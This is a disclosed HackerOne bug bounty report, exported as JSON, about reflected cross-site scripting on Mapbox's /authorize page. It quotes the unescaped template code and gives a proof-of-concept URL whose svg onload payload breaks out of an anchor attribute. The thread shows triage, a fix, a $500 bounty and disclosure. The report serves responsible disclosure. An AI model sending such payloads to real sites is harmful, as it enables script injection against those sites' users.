{"id":143220,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNDMyMjA=","url":"https://hackerone.com/reports/143220","title":"XSS on www.mapbox.com/authorize","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2016-06-05T18:00:42.415Z","submitted_at":"2016-06-05T18:00:42.415Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"stefanofinding","url":"/stefanofinding","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/002/171/2558843b6d2b90f4dd826a661bcef3fd1abb2906_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1366,"url":"https://hackerone.com/mapbox","handle":"mapbox","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/001/366/d4dfa3c8752e3849cdfb22fea49c17bd37f03850_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/366/d4dfa3c8752e3849cdfb22fea49c17bd37f03850_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Mapbox","twitter_handle":"mapbox","website":"https://www.mapbox.com/security","about":"Mapbox is an open source mapping platform, providing building blocks for developers to integrate location into any mobile or online application."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2017-08-14T17:19:52.016Z","bug_reporter_agreed_on_going_public_at":"2017-08-01T10:17:37.202Z","team_member_agreed_on_going_public_at":"2017-08-14T17:19:51.958Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Description\n---\nWhen you don't include the parameter __client_id__ in the request to the endpoint at https://www.mapbox.com/authorize/, the template __template-modal-unauthorized__ (included in the client code of the endpoint)  is rendered with the value of the parameter __redirect_uri__ sent in the request without escaping:\n```html\nCode at https://www.mapbox.com/authorize/\n\u003c% if (obj.redirect) { %\u003e\n      \u003cdiv class='fill-gray pad2y pad4x center'\u003e\n        \u003ca href='\u003c%= obj.redirect %\u003e' class='button col12 close'\u003eBack\u003c/a\u003e\n      \u003c/div\u003e\n\u003c% } %\u003e\n```\n```javascript\nCode at https://www.mapbox.com/authorize/authorize.js\n}).fail(function(err) {\n        Views.modal.show('unauthorized', {\n            msg: err.statusText,\n            redirect: (App.param('redirect_uri')) ?\n                App.param('redirect_uri') :\n                false\n        });\n});\n```\nThe problem is that you can pass any value to __redirect_uri__ and it is going to be added as HTML code, which allows to break the `\u003ca\u003e` element using a `'` and a `\u003e`.\n\nReproduction\n---\nLoad the following URL on Chrome, Firefox, Safari, Internet Explorer 11, or Edge.\n```\nhttps://www.mapbox.com/authorize/?redirect_uri=%27%3E%3Csvg%20onload=%27alert%28document.domain%29%27%3E\n```\nI'm going to share a link to the video in a comment, because the size is greater than 10MB.\n\n---\n\nLet me know if you need more information.","vulnerability_information_html":"\u003ch2 id=\"description\"\u003eDescription\u003c/h2\u003e\n\n\u003cp\u003eWhen you don\u0026#39;t include the parameter \u003cstrong\u003eclient_id\u003c/strong\u003e in the request to the endpoint at \u003ca title=\"https://www.mapbox.com/authorize/\" href=\"/redirect?url=https%3A%2F%2Fwww.mapbox.com%2Fauthorize%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.mapbox.com/authorize/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e, the template \u003cstrong\u003etemplate-modal-unauthorized\u003c/strong\u003e (included in the client code of the endpoint)  is rendered with the value of the parameter \u003cstrong\u003eredirect_uri\u003c/strong\u003e sent in the request without escaping:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003eCode at https://www.mapbox.com/authorize/\n\u003cspan class=\"nt\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"err\"\u003e%\u003c/span\u003e \u003cspan class=\"na\"\u003eif\u003c/span\u003e \u003cspan class=\"err\"\u003e(\u003c/span\u003e\u003cspan class=\"na\"\u003eobj\u003c/span\u003e\u003cspan class=\"err\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eredirect\u003c/span\u003e\u003cspan class=\"err\"\u003e)\u003c/span\u003e \u003cspan class=\"err\"\u003e{\u003c/span\u003e \u003cspan class=\"err\"\u003e%\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;div\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;fill-gray pad2y pad4x center\u0026#39;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;a\u003c/span\u003e \u003cspan class=\"na\"\u003ehref=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;\u0026lt;%= obj.redirect %\u0026gt;\u0026#39;\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;button col12 close\u0026#39;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003eBack\u003cspan class=\"nt\"\u003e\u0026lt;/a\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;/div\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"err\"\u003e%\u003c/span\u003e \u003cspan class=\"err\"\u003e}\u003c/span\u003e \u003cspan class=\"err\"\u003e%\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"nx\"\u003eCode\u003c/span\u003e \u003cspan class=\"nx\"\u003eat\u003c/span\u003e \u003cspan class=\"nx\"\u003ehttps\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"c1\"\u003e//www.mapbox.com/authorize/authorize.js\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}).\u003c/span\u003e\u003cspan class=\"nx\"\u003efail\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eerr\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003eViews\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003emodal\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eshow\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eunauthorized\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n            \u003cspan class=\"na\"\u003emsg\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"nx\"\u003eerr\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003estatusText\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n            \u003cspan class=\"na\"\u003eredirect\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eApp\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eparam\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eredirect_uri\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"p\"\u003e?\u003c/span\u003e\n                \u003cspan class=\"nx\"\u003eApp\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eparam\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eredirect_uri\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e:\u003c/span\u003e\n                \u003cspan class=\"kc\"\u003efalse\u003c/span\u003e\n        \u003cspan class=\"p\"\u003e});\u003c/span\u003e\n\u003cspan class=\"p\"\u003e});\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe problem is that you can pass any value to \u003cstrong\u003eredirect_uri\u003c/strong\u003e and it is going to be added as HTML code, which allows to break the \u003ccode\u003e\u0026lt;a\u0026gt;\u003c/code\u003e element using a \u003ccode\u003e\u0026#39;\u003c/code\u003e and a \u003ccode\u003e\u0026gt;\u003c/code\u003e.\u003c/p\u003e\n\n\u003ch2 id=\"reproduction\"\u003eReproduction\u003c/h2\u003e\n\n\u003cp\u003eLoad the following URL on Chrome, Firefox, Safari, Internet Explorer 11, or Edge.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ehttps://www.mapbox.com/authorize/?redirect_uri=%27%3E%3Csvg%20onload=%27alert%28document.domain%29%27%3E\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eI\u0026#39;m going to share a link to the video in a comment, because the size is greater than 10MB.\u003c/p\u003e\n\n\u003chr\u003e\n\n\u003cp\u003eLet me know if you need more information.\u003c/p\u003e\n","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":60,"name":"Cross-site Scripting (XSS) - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-08-31T10:17:37.290Z","allow_singular_disclosure_after":-105041495.24978483,"singular_disclosure_allowed":true,"vote_count":12,"voters":["fransrosen","mashoud1122","bl4de","aroly","eveeez","geeknik","japz","sumit7","hacklad","dyabla","and 2 more..."],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1000437,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Link to the video: https://vimeo.com/169445824.\nPassword: `xssbringtoyoubystefano`.","markdown_message":"\u003cp\u003eLink to the video: \u003ca title=\"https://vimeo.com/169445824\" href=\"/redirect?url=https%3A%2F%2Fvimeo.com%2F169445824\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://vimeo.com/169445824\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003cbr\u003e\nPassword: \u003ccode\u003exssbringtoyoubystefano\u003c/code\u003e.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-06-05T18:04:01.003Z","updated_at":"2016-06-05T18:04:01.003Z","actor":{"username":"stefanofinding","cleared":true,"url":"/stefanofinding","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/171/2558843b6d2b90f4dd826a661bcef3fd1abb2906_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mapbox","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1005212,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2016-06-08T19:49:19.744Z","updated_at":"2016-06-08T19:49:19.744Z","actor":{"username":"alulsh","cleared":false,"url":"/alulsh","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/039/856/496b75e2cc4a4ce5798ef27243d139b9dd38fea5_original.JPG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mapbox","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1222659,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Apologies for the wait on this and on [#143240](https://hackerone.com/reports/143240) @stefanofindsbugs. We just deployed a patch this evening - can you confirm the fix? ","markdown_message":"\u003cp\u003eApologies for the wait on this and on \u003ca href=\"https://hackerone.com/reports/143240\"\u003e#143240\u003c/a\u003e \u003ca href=\"/stefanofindsbugs\"\u003e@stefanofindsbugs\u003c/a\u003e. We just deployed a patch this evening - can you confirm the fix? \u003c/p\u003e\n","automated_response":false,"created_at":"2016-09-28T22:34:02.316Z","updated_at":"2016-09-28T22:34:02.316Z","actor":{"username":"alulsh","cleared":false,"url":"/alulsh","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/039/856/496b75e2cc4a4ce5798ef27243d139b9dd38fea5_original.JPG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"stefanofinding","url":"/stefanofinding"},"genius_execution_id":null,"team_handle":"mapbox","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1222843,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"No worries, I understand that it takes time to patch issues.\nI just confirmed that I can't reproduce the issue anymore.","markdown_message":"\u003cp\u003eNo worries, I understand that it takes time to patch issues.\u003cbr\u003e\nI just confirmed that I can\u0026#39;t reproduce the issue anymore.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-09-29T00:49:29.163Z","updated_at":"2016-09-29T00:49:29.163Z","actor":{"username":"stefanofinding","cleared":true,"url":"/stefanofinding","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/171/2558843b6d2b90f4dd826a661bcef3fd1abb2906_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mapbox","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1224798,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2016-09-29T22:51:06.381Z","updated_at":"2016-09-29T22:51:06.381Z","actor":{"url":"/mapbox","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/366/d4dfa3c8752e3849cdfb22fea49c17bd37f03850_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Mapbox"}},"bounty_amount":"500.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"mapbox","collaborator":{"username":"stefanofinding","url":"/stefanofinding"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1224884,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for the bounty!","markdown_message":"\u003cp\u003eThank you for the bounty!\u003c/p\u003e\n","automated_response":false,"created_at":"2016-09-30T00:14:24.592Z","updated_at":"2016-09-30T00:14:24.592Z","actor":{"username":"stefanofinding","cleared":true,"url":"/stefanofinding","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/171/2558843b6d2b90f4dd826a661bcef3fd1abb2906_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mapbox","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1881878,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"I would like to disclose this report, it would be great if you agree. Thanks!","markdown_message":"\u003cp\u003eI would like to disclose this report, it would be great if you agree. Thanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2017-08-01T10:17:37.241Z","updated_at":"2017-08-01T10:17:37.241Z","first_to_agree":true,"actor":{"username":"stefanofinding","cleared":true,"url":"/stefanofinding","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/171/2558843b6d2b90f4dd826a661bcef3fd1abb2906_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mapbox","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1927378,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-08-14T17:19:51.979Z","updated_at":"2017-08-14T17:19:51.979Z","actor":{"username":"alulsh","cleared":false,"url":"/alulsh","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/039/856/496b75e2cc4a4ce5798ef27243d139b9dd38fea5_original.JPG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mapbox","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1927379,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-08-14T17:19:52.034Z","updated_at":"2017-08-14T17:19:52.034Z","actor":{"username":"alulsh","cleared":false,"url":"/alulsh","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/039/856/496b75e2cc4a4ce5798ef27243d139b9dd38fea5_original.JPG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mapbox","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}